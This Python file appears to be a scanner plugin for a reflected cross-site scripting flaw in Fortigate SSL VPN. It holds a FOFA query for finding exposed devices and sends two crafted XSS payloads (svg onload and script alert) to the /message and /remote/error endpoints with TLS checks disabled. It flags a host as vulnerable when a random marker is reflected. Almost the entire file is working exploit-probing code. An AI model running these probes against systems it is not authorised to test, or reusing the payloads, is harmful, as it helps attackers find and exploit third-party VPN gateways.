#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  'https://mp.weixin.qq.com/s/HKRyg5sqR1nApclngA01Fg',

      'huixian'   :  '',

      'method'    :   'get',

      'bugname'   :   'Fortigate SSL VPN msg/errmsg xss',

      'level'     :   'low',

      'FOFA'      :   'app="FORTINET-SSLVPN"',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def randomLowercase(n):#返回特定长度的随机小写字母
  import random
  import string
  lst = []
  for j in range(n):
    lst.append(random.choice(string.ascii_lowercase))
  lowercase = ''.join(lst)
  return lowercase
def run(url,ua):
  r0 = randomLowercase(20)
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  targets = [f'/message?title=x&msg=%26%23%3Csvg/onload=alert({r0})%3E%3B',f'/remote/error?errmsg=ABABAB--%3E%3Cscript%3Ealert({r0})%3C/script%3E']
  url1 = url + targets[0]
  url2 = url + targets[1]
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False)
    if r0 in res.text:
      # ret['huixian'] = res.text
      res.close()
      ret['url'] = url1
      ret['ifbug'] = True
      return ret
  except:
    pass
  try:
    resp=requests.get(url=url2,headers=headers,timeout=5,verify=False)
    if r0 in resp.text:
      # ret['huixian'] = res.text
      resp.close()
      ret['url'] = url2
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret